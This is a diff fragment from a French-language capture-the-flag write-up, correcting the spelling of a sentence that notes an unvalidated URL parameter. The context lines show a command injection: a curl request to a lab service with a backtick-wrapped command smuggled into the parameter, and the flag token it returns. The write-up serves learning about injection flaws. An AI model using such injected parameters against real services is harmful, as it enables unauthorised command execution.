@@ -17,7 +17,7 @@ de plus il prend un parametre (grace a l'url) x, qu'il va echo.
 test
 </code></pre>
 
-On se rend compte qu'il n'y a pas de verifaction spécial quant au paramètre, nous essayons donc d'injecter une commande:
+On se rend compte qu'il n'y a pas de verification spéciale par rapport au paramètre, nous essayons donc d'injecter une commande:
 
 <pre><code>> curl IP:4747?x=\`getflag\`
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
